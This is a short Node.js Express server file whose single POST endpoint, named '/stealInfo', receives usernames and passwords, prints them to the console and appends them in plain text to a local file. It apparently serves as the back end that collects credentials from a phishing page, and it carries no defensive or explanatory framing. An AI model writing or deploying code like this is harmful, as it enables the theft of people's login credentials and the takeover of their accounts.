const fs = require('fs');
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
let http = require("http");
let username = "";
let password = "";

app.use(bodyParser.urlencoded({ extended: true })); 

app.post('/stealInfo', (req, res) => {
  res.send(`Success`);

  console.log(req.body.username + req.body.password);
  fs.appendFile('../txtdocs/info.txt', "username: " + req.body.username + ", password: " + req.body.password + "\n", function (err) {
    if (err) throw err;
    console.log('Updated!');
  });
});

const port = 8080;

app.listen(port, () => {
  console.log(`Server running on port${port}`);
});

